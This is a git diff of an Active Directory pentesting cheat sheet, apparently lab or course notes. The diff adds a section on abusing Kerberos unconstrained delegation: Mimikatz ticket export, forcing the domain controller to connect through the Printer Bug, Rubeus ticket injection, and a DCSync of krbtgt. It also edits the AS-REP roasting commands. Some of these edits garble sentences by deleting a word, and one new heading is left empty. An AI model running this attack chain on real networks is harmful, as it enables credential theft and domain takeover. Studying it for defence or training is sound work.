@@ -1,4 +1,4 @@
-# CheatSheet
+![image](https://github.com/Carlo13gen/ToolBox/assets/49983711/50297583-6fe7-49da-ba95-6fa45b0813dc)![image](https://github.com/Carlo13gen/ToolBox/assets/49983711/0646e977-9c6e-45f0-845e-9cc7a7db1ec8)# CheatSheet
 ## Index
 * [General](#general)
   * [Port Forwarding](#create-a-port-forwarding)
@@ -16,6 +16,8 @@
   * [Kerberoasting](#privilege-escalation-using-kerberoasting)
   * [Targeted Kerberoasting AS-REPs](#privilege-escalation-using-targeted-kerberoasting-asreps)
   * [Targeted Kerberoasting Set SPN](#privilege-escalation-using-targeted-kerberoasting-set-spn)
+  * [Kerberos Unconstrained Delegation](#privlege-escalation-using-kerberos-unconstrained-delegation)
+  * [Kerberos Constrained Delegation](#privilege-escalation-using-kerberos-constrained-delegation)
 * [Kerberos](#kerberos)
   * [Introduction](#introduction)
   * [Kerberos Delegation](#kerberos-delegation)
@@ -29,7 +31,6 @@
   * [ACLs Rights Abuse](#persistence-using-acls-rights-abuse)
   * [ACLs Security Descriptors](#persistence-using-acls-security-descriptors)
  
-  
 <div style="page-break-after: always;"></div>
 
 ## General
@@ -514,14 +515,14 @@ john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes
 ```
 
 ### Privilege Escalation Using Targeted Kerberoasting ASREPs
-If a user's UAC settings have "Do not require Kerberos Preauthentication" enabled, it is possible to grab user's crackable AS-REP and bruteforce it offline. With sufficient rights (GenericWrite or GenericAll) Kerberos preauth can be forced disabled as well.
+If a user's UAC settings have "Do not require  Preauthentication" enabled, it is possible to grab user's crackable AS-REP and bruteforce it offline. With sufficient rights (GenericWrite or GenericAll)  preauth can be forced disabled as well.
 
-With the following PowerView command it is possible to enumerate all the accounts having Kerberos Preauth disabled
+With the following PowerView command it is possible to enumerate all the accounts having  Preauth disabled
 ```
 Get-DomainUser -PreauthNotRequired -Verbose
 ```
 
-To force disable Kerberos preauth run the following commands using PowerView
+To force disable  preauth run the following commands using PowerView
 
 Enumerate the permissions for RDPusers on ACLs 
 ```
@@ -539,7 +540,7 @@ Request encrypted AS-REP for offline brute-force using ASREPRoast
 Get-ASREPHash -UserName <username> -Verbose
 ```
 
-To enumerate all the users with Kerberos Preauth disabled using ASREPRoast
+To enumerate all the users with  Preauth disabled using ASREPRoast
 ```
 Invoke-ASREPRoast -Verbose
 ```
@@ -563,6 +564,47 @@ Set-DomainObject -Idenitity <username> -Set @{serviceprincipalname='dcorp/whatev
 ```
 
 Then Kerberoast the user 
+
+### Privilege escalation using Kerberos Unconstrained Delegation
+When set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as user. When unconstrained delegation is enabled, the DC places the user's TGT inside TGS. When presented to the server with unconstrained delgation, the TGT is extracted from TGS and stored in LSASS. This way the server can reuse the user's TGT to access any other resource as the user. 
+
+This method can be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a Domain Admin connects to that machine.
+
+Run the following command to discover computer with unconstrained delegation enabled using PowerView:
+```
+Get-DomainComputer -Unconstrained
+```
+
+Compromise the server where unconstrained delegation is enabled, then we must trick or wait for domain admin to connect a service on the computer with unconstrained delegation enabled.
+
+Then we can export the tickets running the command:
+```
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+```
+
+We can trick a privileged user to connect to a machine with unconstrained delegation using the Printer Bug. A feature of MS-RPRN which allows any domain user to force any machine to connect to second a machine of the domain user's choice. We can force the Domain Controller to connect to the server with unconstrained delegation by abusing the printer bug
+
+Start the listener on the server with unconstrained delegation:
+```
+Rubeus.exe monitor /interval:5 /nowrap
+```
+
+Then on the student VM run the printer bug.
+```
+MS-RPRN.exe \\<domain_controller.domain> \\<unconstrained_delegation_machine.domain>
+```
+
+Copy the base64 encoded TGT, then remove extra spaces and use it on the student VM
+```
+Rubeus.exe ptt /ticket
+```
+
+Once the ticket is injected run DCSync
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
+```
+
+### Privilege Escalation using Kerberos Constrained Delegation
 
 <div style="page-break-after: always;"></div>
 
@@ -793,10 +835,20 @@ Performing the command
 $null | winrs -r:dcorp-mgmt "cmd C:\Users\Public\Safety.bat"
 ```
 <div style="page-break-after: always;"></div>
+
 ## Kerberos
 
 ### Introduction
 Kerberos is the basis of authentication in a Windows Active Directory environment. Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain controller. These tickets represent the client's credentials. Therefore Kerberos is a very interesting target to abuse.
+
+### Kerberos Delegation
+Kerberos Delegation allows to "reuse the end-user credentials to access resources hosted on a different server". Typically this is useful in multi-tier service or applications where Kerberos Double Hop is required. For example, users authenticates to a web server and makes requests to a database server. The web server can request access to the resources on the database server as the user and not as the web server's service account. For the previous example the service account of the web server must be trusted for delegation to be able to make requests as a user.
+
+There are two types of Kerberos Delegation:
+- **General/Basic or Unconstrained Delegation**: which allows the first hop server to request access to any service on any computer in the domain
+- **Constrained Delegation**: which allows the first hop server to request access only to specified services on specified computers. If the user is not using Kerberos authentication to authenticate to the first hop server, Windows offers Protocol Transition to transition the request to Kerberos
+
+In both types of delegation, a mechanism is required to impersonate the incoming user and authenticate to the second hop server as the user.
 
 ## Persisitence
 ### Persistence using Golden Tickets
